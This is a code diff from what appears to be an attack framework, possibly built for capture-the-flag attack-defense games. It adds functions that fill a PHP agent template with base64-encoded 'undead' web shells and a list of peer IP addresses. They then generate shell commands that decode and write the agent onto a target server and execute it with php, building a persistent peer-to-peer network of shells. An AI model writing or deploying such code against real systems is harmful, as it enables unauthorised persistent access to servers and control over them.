@@ -116,7 +116,7 @@ def execute_shell(target,target_port,cmd):
         except Exception,e:
             dump_error(e,target,"function.py execute_shell")
             # execute shell timeout
-            if 'timed out' in str(e):
+            if 'timed out' in str(e) or 'Connection refused' in str(e):
                 return "timeout"
             return "error occurs"
         return res
@@ -307,4 +307,39 @@ def change_password(target,target_port,cmd):
     debug_print(cmd)
     return cmd
 
+# This function is designed to generate and run a p2p network
+def run_p2p(target,target_port,cmd):
+    cmd = create_p2p(target,target_port,cmd)
+    agent_absolute_path = shell_absolute_path + 'agent.php'
+    cmd += ';php ' + agent_absolute_path
+    debug_print(cmd)
+    return cmd
 
+
+# This function is designed to generate a p2p network
+def create_p2p(target,target_port,cmd):
+    template = open('data/p2p/agent.php').read()
+    #normal shell
+    shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,1)
+    template = template.replace('{{undead_release_shell}}',shell_base64)
+    #undead shell
+    shell_name,shell,shell_base64 = generate_shell(target,target_port,cmd,2)
+    template = template.replace('{{undead_shell}}',shell_base64)
+
+    #confi
+    template = template.replace('{{agent_url}}',shell_path + 'agent.php')
+    template = template.replace('{{shell_name}}',shell_name)
+    agent_absolute_path = shell_absolute_path + 'agent.php'
+    
+    #generate peer_addr
+    hosts = open('data/ip.data').readlines()
+    hosts = [host.strip() for host in hosts]
+    peer_addr = str(hosts)[1:-1]
+    template = template.replace('{{peer_addr}}',peer_addr)
+
+    #encode the final shell
+    encode_shell = base64.b64encode(template)
+
+    cmd =  "/bin/echo " + encode_shell + " | /usr/bin/base64 -d | /bin/cat > " + agent_absolute_path
+    debug_print(cmd)
+    return cmd
